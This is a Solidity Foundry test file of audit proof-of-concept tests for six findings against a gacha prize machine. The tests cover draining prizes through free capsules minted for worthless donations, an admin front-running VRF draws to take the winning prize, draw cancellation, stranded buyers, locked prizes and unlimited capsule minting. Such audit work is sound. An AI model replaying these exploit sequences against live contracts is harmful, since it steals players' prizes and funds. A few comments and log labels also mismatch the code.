// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "../src/Machine.sol";
import "../src/Gacha.sol";
import "./MockPrizeNFT.sol";
import "./MockPrizeERC721.sol";
import "./mocks/TestHelpers.sol";
import "./mocks/VRFCoordinatorV2PlusMock.sol";

/// @dev Accepts ERC1155 (so it can hold capsules) but has no ERC721 receiver.
contract ERC1155OnlyWallet is ERC1155Holder {
    function call1155(address target, bytes memory data) external payable {
        (bool ok, bytes memory ret) = target.call{value: msg.value}(data);
        if (!ok) {
            assembly {
                revert(add(ret, 0x20), mload(ret))
            }
        }
    }
}

contract AuditPoCTest is Test {
    GachaMachine machine;
    VRFCoordinatorV2PlusMock vrf;
    GachaNFT capsule;
    MockPrizeNFT junk1155;
    MockPrizeERC721 prize721;

    address deployer = makeAddr("deployer");
    address admin = makeAddr("admin");
    address donor = makeAddr("donor");
    address honest = makeAddr("honest");
    address attacker = makeAddr("attacker");

    uint256 constant EPIC = 0;
    uint256 constant PRICE = 1 ether;
    uint256 constant JUNK_ID = 999;

    function setUp() public {
        vm.startPrank(deployer);
        vrf = new VRFCoordinatorV2PlusMock();
        machine = new GachaMachine(MachineHarness.vrfConfig(address(vrf)));
        capsule = new GachaNFT();
        junk1155 = new MockPrizeNFT();
        prize721 = new MockPrizeERC721();

        machine.grantRole(machine.ADMIN_ROLE(), admin);
        capsule.grantRole(capsule.MINTER_ROLE(), address(machine));
        capsule.revokeRole(capsule.MINTER_ROLE(), deployer);
        vm.stopPrank();

        vm.startPrank(admin);
        machine.registerRarity(address(capsule), "Epic", PRICE);
        machine.approveNFT(EPIC, address(prize721), true);
        // Admin also whitelists a "community" ERC1155 collection for donations.
        machine.approveNFT(EPIC, address(junk1155), true);
        vm.stopPrank();
    }

    function _seedBagWithValuablePrizes(uint256 n) internal {
        vm.startPrank(deployer);
        for (uint256 i = 0; i < n; i++) {
            uint256 id = prize721.mint(donor);
            vm.stopPrank();
            vm.startPrank(donor);
            prize721.approve(address(machine), id);
            machine.donateNFT(address(prize721), id, 1, EPIC);
            vm.stopPrank();
            vm.startPrank(deployer);
        }
        vm.stopPrank();
    }

    // =========================================================================
    // FINDING 1: donateNFT hands out a free capsule with no value floor, so a
    // worthless-but-approved token buys a uniform draw on the whole bag.
    // =========================================================================

    function test_poc_donationMintsFreeCapsuleAndDrainsBag() public {
        _seedBagWithValuablePrizes(4);

        // Attacker mints himself dust from the approved ERC1155 collection.
        vm.prank(deployer);
        junk1155.mint(attacker, JUNK_ID, 100);

        vm.startPrank(attacker);
        junk1155.setApprovalForAll(address(machine), true);
        capsule.setApprovalForAll(address(machine), true);
        vm.stopPrank();

        uint256 won;
        for (uint256 round = 0; round < 8; round++) {
            if (machine.getPrizeCount(EPIC) == 0) break;

            // 1 unit of dust == 1 bag slot == 1 free capsule.
            vm.prank(attacker);
            machine.donateNFT(address(junk1155), JUNK_ID, 1, EPIC);
            assertEq(capsule.balanceOf(attacker, 0), 1, "free capsule");

            vm.prank(attacker);
            uint256 requestId = machine.play(EPIC);
            vrf.fulfill(requestId, uint256(keccak256(abi.encode(round))));

            vm.prank(attacker);
            machine.claim(0);
        }

        won = prize721.balanceOf(attacker);

        emit log_named_uint("ETH spent by attacker", attacker.balance);
        emit log_named_uint("valuable ERC721 prizes stolen", won);
        emit log_named_uint("prizes left in bag", machine.getPrizeCount(EPIC));

        assertEq(attacker.balance, 0, "attacker never paid the capsule price");
        assertGt(won, 0, "attacker extracted real prizes for free");
    }

    // =========================================================================
    // FINDING 2: ADMIN_ROLE can front-run the VRF fulfillment. The random word
    // is public in the fulfillment tx, so admin computes the winning index and
    // pulls that exact prize out of the bag first.
    // =========================================================================

    function test_poc_adminFrontRunsVrfToStealTheWinningPrize() public {
        _seedBagWithValuablePrizes(3);

        vm.deal(honest, PRICE);
        vm.startPrank(honest);
        machine.purchase{value: PRICE}(EPIC);
        capsule.setApprovalForAll(address(machine), true);
        uint256 requestId = machine.play(EPIC);
        vm.stopPrank();

        // Admin observes the pending fulfillment word in the mempool.
        uint256 word = 1;
        uint256 winningIndex = word % 3;
        GachaMachine.PrizeInfo memory jackpot = machine.getPrizeInfo(EPIC, winningIndex);

        // withdrawPrize only blocks when bag.length <= pendingDraws, so with a
        // non-empty bag the admin can extract the exact winner mid-flight.
        vm.prank(admin);
        machine.withdrawPrize(EPIC, winningIndex, jackpot.tokenContract, jackpot.tokenId, admin);

        vrf.fulfill(requestId, word);

        vm.prank(honest);
        machine.claim(0);

        assertEq(prize721.ownerOf(jackpot.tokenId), admin, "admin took the winning prize");
        assertTrue(prize721.ownerOf(jackpot.tokenId) != honest);
    }

    // =========================================================================
    // FINDING 3: ADMIN_ROLE can nullify any in-flight draw instantly.
    // =========================================================================

    function test_poc_adminCancelsAnyPendingDrawWithNoDelay() public {
        _seedBagWithValuablePrizes(2);

        vm.deal(honest, PRICE);
        vm.startPrank(honest);
        machine.purchase{value: PRICE}(EPIC);
        capsule.setApprovalForAll(address(machine), true);
        uint256 requestId = machine.play(EPIC);
        vm.stopPrank();

        vm.prank(admin);
        machine.rescueStuckDraw(requestId);

        // Real fulfillment is now a silent no-op.
        vrf.fulfill(requestId, 0);

        GachaMachine.PrizeClaim memory queued = machine.getClaim(honest, 0);
        assertEq(queued.tokenContract, address(0), "downgraded to a capsule refund");
        assertEq(machine.getClaimCount(honest), 1);
    }

    // =========================================================================
    // FINDING 4: capsules are sold for ETH but can be bricked with no refund.
    // =========================================================================

    function test_poc_capsuleHolderStrandedAfterRarityDisabled() public {
        _seedBagWithValuablePrizes(2);

        vm.deal(honest, PRICE);
        vm.prank(honest);
        machine.purchase{value: PRICE}(EPIC);

        // Economist (no withdraw rights, lower trust) kills the rarity.
        vm.prank(admin);
        machine.setRarityEnabled(EPIC, false);

        vm.startPrank(honest);
        capsule.setApprovalForAll(address(machine), true);
        vm.expectRevert("Rarity not enabled");
        machine.play(EPIC);
        vm.stopPrank();

        // ETH is already withdrawable by admin; holder has no refund path.
        assertEq(capsule.balanceOf(honest, 0), 1);
        assertEq(address(machine).balance, PRICE);
        vm.prank(admin);
        machine.withdraw(address(0), PRICE, admin);
        assertEq(admin.balance, PRICE);
    }

    // =========================================================================
    // FINDING 5: a won prize the winner cannot receive is stuck forever. There
    // is no admin recovery for assigned-but-unclaimable prizes.
    // =========================================================================

    function test_poc_wonErc721IsPermanentlyStuck() public {
        _seedBagWithValuablePrizes(1);

        ERC1155OnlyWallet wallet = new ERC1155OnlyWallet();
        vm.deal(address(wallet), PRICE);

        wallet.call1155{value: PRICE}(address(machine), abi.encodeCall(machine.purchase, (EPIC)));
        wallet.call1155(address(capsule), abi.encodeCall(capsule.setApprovalForAll, (address(machine), true)));

        vm.recordLogs();
        wallet.call1155(address(machine), abi.encodeCall(machine.play, (EPIC)));
        vrf.fulfill(1, 0);

        assertEq(machine.getClaimCount(address(wallet)), 1);

        // The prize left the bag, so no admin function can reach it any more.
        vm.expectRevert();
        wallet.call1155(address(machine), abi.encodeCall(machine.claim, (0)));

        assertEq(prize721.ownerOf(0), address(machine), "ERC721 locked in the machine");
        assertEq(machine.getPrizeCount(EPIC), 0, "not in the bag, not withdrawable");

        vm.prank(admin);
        vm.expectRevert("Invalid prize index");
        machine.withdrawPrize(EPIC, 0, address(prize721), 0, admin);
    }

    // =========================================================================
    // FINDING 6: GachaNFT DEFAULT_ADMIN_ROLE stays on the deploying EOA and is
    // outside the machine's two-step admin handoff. It can re-grant MINTER_ROLE
    // and print unlimited capsules, or disable id 0 and brick the machine.
    // =========================================================================

    function test_poc_nftAdminReGrantsMinterAndPrintsCapsules() public {
        _seedBagWithValuablePrizes(3);

        // Machine admin handoff does not touch GachaNFT roles.
        vm.prank(deployer);
        machine.transferAdmin(admin);
        vm.prank(admin);
        machine.acceptAdmin();

        vm.startPrank(deployer);
        capsule.grantRole(capsule.MINTER_ROLE(), deployer);
        capsule.mint(attacker, 0, 50);
        vm.stopPrank();

        assertEq(capsule.balanceOf(attacker, 0), 50, "50 capsules minted for free");

        vm.startPrank(attacker);
        capsule.setApprovalForAll(address(machine), true);
        uint256 requestId = machine.play(EPIC);
        vm.stopPrank();
        vrf.fulfill(requestId, 0);
        vm.prank(attacker);
        machine.claim(0);

        assertEq(prize721.balanceOf(attacker), 1, "prize drained with a printed capsule");
    }

    function test_poc_nftAdminCanBrickTheMachine() public {
        vm.prank(deployer);
        capsule.setRarityEnabled(0, false);

        vm.deal(honest, PRICE);
        vm.prank(honest);
        vm.expectRevert("Rarity not enabled");
        machine.purchase{value: PRICE}(EPIC);
    }
}
